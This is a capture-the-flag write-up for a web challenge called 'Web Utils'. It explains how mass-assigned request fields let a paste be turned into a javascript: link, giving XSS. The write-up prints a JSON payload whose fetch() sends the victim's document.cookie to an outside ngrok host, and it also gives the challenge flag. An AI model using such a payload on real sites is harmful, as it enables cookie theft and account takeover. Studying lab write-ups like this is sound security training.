Web Utils
===
**Category**: Web

**Points**: 121 (131 solves)

**Author**: BrownieInMotion, Jim
### Description
- My friend made this dumb tool; can you try and steal his cookies? If you send me a link, I can pass it along.
- Site: `https://web-utils.dicec.tf/`
- Source: `app.zip`
### Solution
- In file `api.js` we can see in `createPaste` and `createLink` all appear `...req.body`. Let's try to debug with `...`
![image](https://user-images.githubusercontent.com/54855855/107367846-5daaf380-6b12-11eb-9ae6-b28524488ea9.png)
So we need can pass arguments as desired and we can see type = `link` can trigger xss by `javascript:`![image](https://user-images.githubusercontent.com/54855855/107368131-bf6b5d80-6b12-11eb-9a6a-aa5d814c4c1f.png)
### Payload
```
{
"data":"javascript:fetch('http://9127bf181722.ngrok.io/?a'+document.cookie)",
"type":"link"
}
```
### Flag
`dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}`
